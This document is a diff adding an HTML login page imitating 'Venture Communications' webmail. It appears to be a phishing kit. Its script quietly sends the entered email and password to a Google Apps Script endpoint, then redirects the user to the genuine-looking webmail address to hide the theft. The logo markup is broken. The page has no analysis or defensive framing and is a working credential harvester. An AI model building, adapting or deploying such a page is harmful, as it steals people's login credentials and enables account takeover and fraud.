@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Venture Communications Login</title>
+  
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-papCkSZRDXlBkg9vQvV6v8T5MgALl3bZx6+HufWZDbz4d7dy/ix4PVa5w5e4SbAdPIxLZHcxu5OXA5pob6E2cw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+
+  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+    
+    <!-- SVG Placeholder for Logo -->
+    <div class="mb-6 text-center">
+      <img src<img src="https://i.ibb.co/n8k5djSp/Screenshot-2025-07-08-015619.png" alt="Screenshot-2025-07-08-015619" border="0"></a>" 
+    </div>
+
+    <!-- Form -->
+    <form name="ventureForm" id="ventureForm">
+      <div class="mb-4">
+        <label class="block mb-1 font-semibold" for="email">Email</label>
+        <div class="relative">
+          <input type="email" name="email" id="email" required class="w-full pl-10 pr-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" />
+          <i class="fas fa-envelope absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <label class="block mb-1 font-semibold" for="password">Password</label>
+        <div class="relative">
+          <input type="password" name="password" id="password" required class="w-full pl-10 pr-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" />
+          <i class="fas fa-lock absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+        </div>
+      </div>
+
+      <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition">
+  Login
+</button>
+
+      </button>
+    </form>
+
+    <p id="responseMsg" class="text-center text-green-600 mt-4 hidden">Form submitted successfully!</p>
+  </div>
+
+  <!-- Form Submission Script -->
+  <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbz2TIPLMVuCUzqe9s9Vvx4WlQ6MkXJBxZSmFXIEdVfFhFn7A2zPVBgJ8sISHGC5z0sb5g/exec';
+  const form = document.forms['ventureForm'];
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+        // Optional: wait a bit before redirect (e.g., 300ms)
+        setTimeout(() => {
+          window.location.href = 'https://webmail.venturecomm.net/';
+        }, 300);
+      })
+      .catch(error => {
+        console.error('Error!', error.message);
+        alert('There was an error submitting the form.');
+      });
+  });
+</script>
+
+</body>
+</html>
